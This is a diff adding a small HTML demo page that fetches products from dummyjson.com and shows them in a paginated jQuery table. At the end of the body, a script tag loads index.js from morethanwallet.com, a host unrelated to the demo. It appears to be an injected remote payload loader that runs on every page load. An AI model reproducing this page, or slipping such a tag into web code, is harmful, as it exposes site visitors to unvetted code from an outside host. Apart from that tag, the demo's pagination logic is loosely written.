@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fetch API</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+  <script>
+    const url = "https://dummyjson.com/products?limit=100"
+    const opt = {
+      // config for fetch
+      mode: "cors", // cross domain request is allowed
+    };
+
+    const pageSize = 10;
+    let currentPage = 1;
+    let offset = 0; // Initial offset for fetching data
+
+    $(() => {
+      fetchData()
+    });
+
+    const fetchData = async () => {
+      try {
+        let response = await fetch(url, opt)
+        let data = await response.json()
+        const pageData = data.products;
+        createTable(pageData)
+      } catch (e) {
+        console.error(e)
+      }
+    };
+
+    const createTable = (data) => {
+      let container = $("#myTable");
+      container.empty();
+
+      let tb = $("<table>").addClass("table table-bordered table-hovered");
+      let trh = createTableHeader();
+      tb.append(trh);
+
+      const startIndex = (currentPage - 1) * pageSize;
+      const endIndex = Math.min(startIndex + pageSize, data.length);
+
+      for (let i = startIndex; i < endIndex; i++) {
+        let tr = createRow(data[i]);
+        tb.append(tr);
+      }
+
+      container.append(tb);
+
+      const pagination = $("#pagination");
+      pagination.empty();
+
+      if (currentPage > 1) {
+        const prevBtn = $("<button>").addClass("bg-blue-500 text-white font-semibold px-6 py-3 rounded-md shadow-md hover:bg-blue-700 focus:outline-none focus:ring focus:border-blue-300").text("Previous").click(() => {
+          currentPage--;
+          offset -= pageSize; // for getting the updated data
+          fetchData(); // for creating new table with new data instead of the old table
+        });
+        pagination.append(prevBtn);
+      }
+
+      if (endIndex < data.length) {
+        const nextBtn = $("<button>").addClass("bg-blue-500 text-white font-semibold px-6 py-3 rounded-md shadow-md hover:bg-blue-700 focus:outline-none focus:ring focus:border-blue-300").text("Next").click(() => {
+          currentPage++;
+          offset += pageSize;
+          fetchData();
+        });
+        pagination.append(nextBtn);
+      }
+    };
+
+    const createTableHeader = () => {
+      const headers = ["#", "Title", "Price", "Brand", "About"];
+      const tr = $("<tr>").addClass("bg-gray-100");
+      headers.forEach(header => {
+        const th = $("<th>").addClass("bg-blue-500 text-white font-semibold px-4 py-2 rounded-md shadow-md hover:bg-blue-700 focus:outline-none focus:ring focus:border-blue-300 text-sm").text(header);
+        tr.append(th);
+      });
+      return tr;
+    };
+
+    const createRow = (row) => {
+      const tr = $("<tr>").addClass("bg-white hover:bg-gray-100");
+      const rowData = [row.id, row.title, row.price, row.brand, row.description];
+      rowData.forEach(data => {
+        const td = $("<td>").addClass("border border-gray-300 px-4 py-2 text-xs").text(data);
+        tr.append(td);
+      });
+      return tr;
+    };
+
+  </script>
+</head>
+
+<body>
+  <div id="myTable"></div>
+  <div id="pagination"></div>
+  <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+
+</html>
